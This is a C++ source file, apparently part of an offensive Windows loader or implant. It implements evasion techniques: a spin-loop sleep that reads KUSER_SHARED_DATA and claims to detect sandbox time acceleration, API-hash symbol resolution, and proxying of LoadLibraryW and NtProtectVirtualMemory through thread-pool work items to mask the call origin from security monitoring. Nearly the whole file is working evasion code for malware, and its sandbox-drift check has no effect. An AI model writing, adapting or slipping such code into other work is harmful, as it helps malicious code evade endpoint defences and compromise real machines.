/* Proxy.cpp */
#include <Windows.h>
#include "Structs.h"
#include "Primitives.h"
#include "Common.h"
#include "Debug.h"

/*================================================
@ SharedTimeStamp Function
# Reads the current system time directly from
# KUSER_SHARED_DATA without issuing any API calls
================================================*/
ULONG64 SharedTimeStamp() {

    volatile PKUSER_SHARED_DATA UserSharedData = USER_SHARED_DATA;

    LARGE_INTEGER TimeStamp {
        .LowPart = UserSharedData->SystemTime.LowPart,
        .HighPart = UserSharedData->SystemTime.High1Time
    };

    return TimeStamp.QuadPart;
}

/*================================================
@ SharedSleep Function
# Performs a spinloop-based sleep by polling
# KUSER_SHARED_DATA. Detects sandbox time
# acceleration via timestamp drift check
================================================*/
VOID SharedSleep(
    _In_ ULONG64 uMilliseconds
) {

    ULONG64 Start64 = SharedTimeStamp() + (uMilliseconds * DELAY_TICKS);

    for (SIZE_T Index = 0; SharedTimeStamp() < Start64; Index++);

    if ((SharedTimeStamp() - Start64) > 2000)
        return;
}

/*================================================
@ WorkItemLoadLibrary Function
# Loads a library by queuing LoadLibraryW as a
# work item via RtlQueueWorkItem, making the call
# appear to originate from a legitimate worker thread
# Polls for the module handle with a retry limit
================================================*/
PVOID Proxy::WorkItemLoadLibrary(
    _In_ PWSTR LibraryName
) {

    PVOID                               Module              = nullptr;
    ULONG                               Count               = 0;
    NTSTATUS                            Status              = STATUS_SUCCESS;

    if (!NT_SUCCESS(Status = g_Win32.Nt.RtlQueueWorkItem((WORKERCALLBACKFUNC)g_Win32.K32.LoadLibraryW, LibraryName, WT_EXECUTEDEFAULT))) {
#ifdef DEBUG
        DBGPRINT("[-] RtlQueueWorkItem Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
        goto Leave;
    }

    Count = 5;

    do {
        if ((Module = g_Win32.K32.GetModuleHandleW(LibraryName))) {
            break;
        }
        SharedSleep(115);
    } while (Count--);

Leave:
    return Module;
}

/*================================================
@ WorkItemProxyNtProtectVirtualMemory Function
# Proxies NtProtectVirtualMemory through the thread
# pool worker via RtlQueueWorkItem and an assembly
# stub, masking the direct API call origin
================================================*/
struct PROTECT_MEMORY_CTX {
    PVOID NtProtectVirtualMemory;

    struct {
        PVOID ProcessHandle;
        PVOID* BaseAddress;
        PVOID RegionSize;
        PVOID NewProtection;
        PVOID OldProtection;
    } Args;
};

extern "C" VOID StubProxyNtProtectVirtualMemory(IN PROTECT_MEMORY_CTX* Ctx);

NTSTATUS Proxy::WorkItemNtProtectVirtualMemory(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _Inout_ PSIZE_T RegionSize,
    _In_ ULONG NewProtection,
    OUT PULONG OldProtection
) {
    HANDLE                               EventHandle                = nullptr;
    NTSTATUS                             Status                     = STATUS_SUCCESS;
    PROTECT_MEMORY_CTX                   Ctx                        = {
                                                                 .NtProtectVirtualMemory = Resolver::LdrShieldedSymbolResolveByHash(Resolver::LdrGetModuleByHash(Hash::ExprHashStrDjb2(L"ntdll.dll")),
                                                                     Hash::ExprHashStrDjb2("NtProtectVirtualMemory")),

                                                                 .Args = {
                                                                     .ProcessHandle = ProcessHandle,
                                                                     .BaseAddress = BaseAddress,
                                                                     .RegionSize = RegionSize,
                                                                     .NewProtection = (PVOID)NewProtection,
                                                                     .OldProtection = (PVOID)OldProtection
         },
    };

    if (!NT_SUCCESS(Status = g_Win32.Nt.NtCreateEvent(&EventHandle, EVENT_ALL_ACCESS, nullptr, NotificationEvent, FALSE))) {
#ifdef DEBUG
        DBGPRINT("[-] NtCreateEvent Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
        goto Leave;
    }

    if (!NT_SUCCESS(Status = g_Win32.Nt.RtlQueueWorkItem((WORKERCALLBACKFUNC)StubProxyNtProtectVirtualMemory, &Ctx, WT_EXECUTEDEFAULT))) {
#ifdef DEBUG
        DBGPRINT("[-] RtlQueueWorkItem Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
        goto Leave;
    }

    if (!NT_SUCCESS(Status = g_Win32.Nt.RtlQueueWorkItem((WORKERCALLBACKFUNC)g_Win32.Nt.NtSetEvent, EventHandle, WT_EXECUTEDEFAULT))) {
#ifdef DEBUG
        DBGPRINT("[-] RtlQueueWorkItem[2] Failed With Error -> %lx - %s.%d \n", Status, GET_FILENAME(__FILE__), __LINE__);
#endif
        goto Leave;
    }

    g_Win32.K32.WaitForSingleObject(EventHandle, 0x1000);

Leave:
    if (EventHandle) {
        Macro::DeleteHandle(EventHandle);
    }

    return Status;
}
